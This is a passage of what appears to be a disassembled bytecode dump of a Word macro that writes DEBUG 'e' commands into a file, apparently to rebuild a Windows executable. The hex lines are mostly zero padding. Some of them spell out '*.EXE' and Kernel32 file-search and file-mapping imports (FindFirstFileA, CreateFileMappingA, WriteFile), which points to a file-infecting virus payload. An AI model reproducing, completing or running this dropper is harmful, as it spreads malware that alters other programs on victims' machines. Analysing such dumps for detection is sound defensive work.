' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #248:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #249:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #250:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #251:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #252:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #253:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #254:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #255:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1090 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #256:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #257:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #258:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #259:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #260:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #261:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #262:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #263:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1110 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #264:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #265:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1130 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #266:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #267:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #268:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #269:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #270:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #271:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #272:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #273:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #274:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #275:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #276:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #277:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #278:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #279:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #280:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1220 00 00 00 00 00 00 00 00 00 00 2a 2e 45 58 45 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #281:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #282:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #283:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #284:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1260 00 00 00 00 00 00 00 00 00 00 00 00 11 20 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #285:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1270 00 00 00 00 00 00 00 00 00 00 00 00 4b 45 52 4e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #286:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1280 45 4c 33 32 2e 64 6c 6c 00 11 00 00 00 47 65 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #287:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1290 4d 6f 64 75 6c 65 48 61 6e 64 6c 65 41 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #288:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12a0 00 00 0f 00 00 00 47 65 74 50 72 6f 63 41 64 64 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #289:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12b0 72 65 73 73 00 00 00 00 00 0c 00 00 00 43 72 65 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #290:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12c0 61 74 65 46 69 6c 65 41 00 00 00 00 00 0a 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #291:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12d0 00 57 72 69 74 65 46 69 6c 65 00 00 00 00 00 0c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #292:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12e0 00 00 00 47 65 74 46 69 6c 65 53 69 7a 65 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #293:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12f0 00 00 00 13 00 00 00 43 72 65 61 74 65 46 69 6c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #294:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1300 65 4d 61 70 70 69 6e 67 41 00 00 00 00 00 0e 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #295:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1310 00 00 4d 61 70 56 69 65 77 4f 66 46 69 6c 65 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #296:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1320 00 00 00 00 10 00 00 00 55 6e 6d 61 70 56 69 65 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #297:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1330 77 4f 66 46 69 6c 65 00 00 00 00 00 0c 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #298:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1340 43 6c 6f 73 65 48 61 6e 64 6c 65 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #299:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1350 0f 00 00 00 46 69 6e 64 46 69 72 73 74 46 69 6c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #300:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1360 65 41 00 00 00 00 00 0e 00 00 00 46 69 6e 64 4e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #301:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1370 65 78 74 46 69 6c 65 41 00 00 00 00 00 0a 00 00 "
' 	Add 
' 	LitDI2 0x0022 
